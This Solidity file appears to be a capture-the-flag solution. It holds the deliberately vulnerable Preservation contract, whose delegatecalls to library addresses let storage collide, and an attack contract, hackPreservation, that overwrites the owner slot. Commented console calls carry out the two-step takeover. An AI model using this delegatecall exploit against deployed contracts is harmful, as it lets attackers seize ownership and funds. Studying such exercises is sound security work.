// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}

contract hackPreservation {
  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 

  function setTime(uint _address) public {
    owner = address(uint160(_address));
  }

  function convertAddress(address add) public pure returns (uint256) {
      return uint256(uint160(add));
  }

}

//32 byte hex of the contracts address
//await contract.setFirstTime('0x0000000000000000000000005C07F405DB9418FB788EAA40A7AA74E1609C4F36');
//uint256 or 32 byte hex  of my address
//await contract.setFirstTime('1272588874374453735279966830844380764476615384030');